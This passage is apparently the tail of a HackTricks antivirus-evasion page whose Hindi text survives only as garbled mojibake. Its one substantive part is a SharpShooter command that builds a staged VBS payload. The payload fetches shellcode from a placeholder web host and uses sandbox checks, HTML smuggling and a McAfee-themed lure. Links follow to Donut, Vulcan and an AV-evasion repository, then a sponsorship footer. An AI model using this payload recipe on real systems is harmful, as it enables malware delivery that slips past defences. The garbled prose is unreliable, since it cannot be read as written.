# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### рдЕрдзрд┐рдХ

{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **cybersecurity company** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **company рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рддрдХ рдкрд╣реБрдБрдЪ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **Join the** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter рдкрд░** рдореБрдЭреЗ **follow** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **hacktricks repo** рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА hacking tricks рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
